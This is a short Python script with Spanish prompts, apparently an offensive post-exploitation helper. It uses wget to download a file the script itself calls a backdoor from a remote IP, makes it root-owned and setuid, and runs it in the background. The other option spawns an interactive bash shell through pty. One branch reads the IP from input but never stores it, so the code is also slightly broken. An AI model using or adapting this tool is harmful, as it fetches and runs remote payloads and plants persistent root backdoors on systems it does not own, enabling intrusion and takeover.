import os
import pty
import argparse

shell = ""
ip_remota = ""
nombre_backdoor = ""

parser = argparse.ArgumentParser()
parser.add_argument("-r ", "--remote", help="IP servidor web")
parser.add_argument("-e", "--executable", help="nombre del ejecutable")
args = parser.parse_args()

if args.remote is None or args.executable is None:
    args.remote = ""
    args.executable = ""

if len(args.remote) != 0 and len(args.executable) != 0 :
    ip_remota = args.remote
    nombre_backdoor = args.executable

else:
    shell = input("Shell Local / Remota [l/R] :  \n")

if len(shell) == 0 or shell[0].upper() == "R":
    if len(nombre_backdoor) == 0 and len(ip_remota) == 0 :
        input("Introduce la IP a la que se conectara para descargar el ejecutable :  \n")
        nombre_backdoor = input("Introduce nombre del ejecutable (INCLUYE EL PUNTO SI ES OCULTO) :  \n")

    os.system("wget http://" + ip_remota + "/" + nombre_backdoor)
    os.system("chown root:root " + nombre_backdoor)
    os.system("chmod +x " + nombre_backdoor)
    os.system("chmod u+s " + nombre_backdoor)
    os.system("./" + nombre_backdoor + " &")

else:
    pty.spawn("/bin/bash")
